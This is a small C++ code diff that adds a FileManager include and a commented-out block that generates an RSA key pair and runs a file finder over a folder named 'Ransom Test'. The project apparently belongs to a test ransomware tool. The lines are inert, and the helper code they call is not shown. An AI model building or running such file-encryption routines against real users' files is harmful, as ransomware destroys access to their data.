@@ -1,4 +1,5 @@
 #include "ServerInterface.h"
+#include "FileManager.h"
 
 #include <csignal>
 
@@ -35,3 +36,11 @@ int main() {
 
     return 0;
 }
+
+// encrypting files in a directory
+//std::string cwd = "C:\\Users\\ethan\\Desktop\\Ransom Test";
+//RSAKeys keys = LGCrypto::GenerateRSAPair(2048);
+//
+//FileManager mgr(keys.pub);
+//mgr.FindFiles(cwd);
+//mgr.OutputFoundFiles(keys.priv);
